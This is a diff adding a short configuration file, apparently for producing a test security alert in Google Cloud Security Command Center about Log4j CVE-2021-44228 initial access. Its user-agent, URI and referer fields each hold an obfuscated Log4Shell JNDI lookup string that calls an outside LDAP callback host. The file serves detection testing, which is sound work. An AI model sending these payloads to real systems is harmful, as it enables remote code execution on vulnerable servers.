@@ -1,0 +1,13 @@
+av 1
+
+action gcp {
+
+    $user-agent = """${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}"""
+    $uri = """${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}"""
+    $referer = """${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}"""
+    $rule_desc = "Initial Access detected leveraging Log4j CVE-2021-44228"
+    $rule_name = "log4_initialaccess"
+    $org = "Enron Corp. Inc."
+    
+    exec GoogleCloudSecurityCommandCenterNotification
+}
